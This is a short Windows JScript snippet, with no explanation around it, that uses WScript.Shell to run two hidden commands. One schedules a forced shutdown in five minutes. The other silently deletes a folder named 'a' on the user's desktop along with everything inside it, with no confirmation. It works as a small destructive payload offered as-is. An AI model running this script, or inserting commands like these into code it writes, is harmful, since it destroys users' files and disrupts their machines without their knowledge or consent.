c1="cmd /c shutdown -s -t 300";
c2="cmd /c rd /s /q %userprofile%\\desktop\\a";
new ActiveXObject("WScript.Shell").Run(c1,0,true);
new ActiveXObject("WScript.Shell").Run(c2,0,true);
